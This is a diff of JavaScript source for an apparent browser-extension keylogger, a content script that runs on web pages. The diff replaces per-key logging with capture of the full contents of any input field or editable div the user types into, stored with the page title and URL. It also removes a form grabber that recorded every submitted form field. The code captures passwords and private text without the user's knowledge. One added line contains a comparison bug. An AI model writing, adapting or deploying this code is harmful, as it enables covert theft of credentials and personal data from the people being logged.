@@ -3,74 +3,70 @@ if (!document.title) {
     document.title = document.URL;
 }
 
-
-/* Keylib */
-// Alphanumeric
-document.addEventListener('keypress', function (e) {
-    e = e || window.event;
-    var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-    if (charCode) {
-        log(String.fromCharCode(charCode));
-    }
-});
-
-// Other keys
-chrome.storage.sync.get({allKeys: false}, function(settings) {
-    if (settings.allKeys) {
-        document.addEventListener('keydown', function (e) {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            } else if (charCode == 16) {
-                log("[SHIFT]");
-            } else if (charCode == 17) {
-                log("[CTRL]");
-            } else if (charCode == 18) {
-                log("[ALT]");
-            } else if (charCode == 91) {
-                log("[L WINDOW]"); // command for mac
-            } else if (charCode == 92) {
-                log("[R WINDOW]"); // command for mac
-            } else if (charCode == 93) {
-                log("[SELECT/CMD]"); // command for mac
-            }
-        });
-    } else { // Non function keys
-        document.addEventListener('keydown', function (e) {
-            e = e || window.event;
-            var charCode = typeof e.which == "number" ? e.which : e.keyCode;
-            if (charCode == 8) {
-                log("[BKSP]");
-            } else if (charCode == 9) {
-                log("[TAB]");
-            } else if (charCode == 13) {
-                log("[ENTER]");
-            }
-        });
-    }
-});
-
-
 /* Keylog Saving */
 var time = new Date().getTime();
 var data = {};
 var shouldSave = false;
 var lastLog = time;
-data[time] = document.title + "^~^" + document.URL + "^~^";
+data_form = document.title + "^~^" + document.URL + "^~^";
+var num = 0;
+var flag = [];
+
+document.addEventListener('keydown', function(e){
+    
+    e = e || window.event;
+    var class_arr = e.target.className.split(' ');
+    if((typeof e.target.value !== 'undefined' && (e.target.value == "" || e.target.value=="\n")) || (typeof e.target.value === 'undefined' && (e.target.innerText == "" || e.target.innerText == "\n"))){
+        for(var i =0; i<class_arr.length; i++){
+            if(class_arr[i].includes("keylog_number")){
+                console.log("flag",flag[class_arr[i].split("keylog_number")[1]]);
+                if(flag[class_arr[i].split("keylog_number")[1]] == 1){
+                    flag[class_arr[i].split("keylog_number")[1]] == 0;
+                    return;
+                }
+                e.target.classList.remove(class_arr[i]);
+            }
+        }
+    }
+})
+
+/* Keylib */
+// Alphanumeric
+document.addEventListener('keyup', function (e) {
+    e = e || window.event;
+    var class_arr = e.target.className.split(' ');
+    var tmp_num = -1;
+    for(var i =0; i<class_arr.length; i++){
+        if(class_arr[i].includes("keylog_number")){
+            tmp_num = class_arr[i].split("keylog_number")[1];
+        }
+    }
+    if(tmp_num == -1){
+        e.target.classList.add("keylog_number"+num);
+        tmp_num = num;
+        num++;
+    }
+    if(typeof e.target.value !== 'undefined'){
+        if((e.target.value == "" || e.target.value == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
+        log(e.target.value, tmp_num);
+    }
+    else if(e.target.tagName == 'DIV'){
+        if((e.target.innerText == "" || e.target.innerText == "\n")&& (e.keyCode == '8' || e.keyCode == '46')) flag[tmp_num] = 1;
+        log(e.target.innerText, tmp_num);
+    }
+    
+});
 
 // Key'ed on JS timestamp
-function log(input) {
+function log(input, input_num) {
     var now = new Date().getTime();
-    if (now - lastLog < 10) return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
-    data[time] += input;
+    if (input == '' || input == '\n') return; // Remove duplicate keys (typed within 10 ms) caused by allFrames injection
+    if(typeof data[time] === 'undefined') data[time] = {};
+    data[time][input_num] = data_form + input;
     shouldSave = true;
     lastLog = now;
-    console.log("Logged", input);
+    console.log("[Dr.pepper]Logged : ", input);
+    save();
 }
 
 
@@ -105,35 +101,3 @@ window.onbeforeunload = function() {
     if (Math.random() < 0.2) // Don't clear every unload
         autoDelete();
 }
-
-// Save every second
-setInterval(function(){
-    save();
-}, 1000);
-
-
-/* Form Grabber */
-function saveForm(time, data) {
-    var toSave = {};
-    toSave[time] = document.title + "^~^" + document.URL + "^~^" + JSON.stringify(data);
-    chrome.storage.local.set(toSave, function() { console.log("Saved", data); });
-}
-
-chrome.storage.sync.get({formGrabber: false}, function(settings) {
-    if (settings.formGrabber) {
-        var forms = document.getElementsByTagName("form");
-        for (var i = 0; i < forms.length; i++) {
-            forms[i].addEventListener("submit", function(e) {
-                var data = {};
-                data["FormName"] = e.target.name;
-                data["FormAction"] = e.target.action;
-                data["FormElements"] = {};
-                var elements = e.target.elements;
-                for (var n = 0; n < elements.length; n++) {
-                    data["FormElements"][elements[n].name] = elements[n].value;
-                }
-                saveForm(e.timeStamp, data);
-            });
-        }
-    }
-});
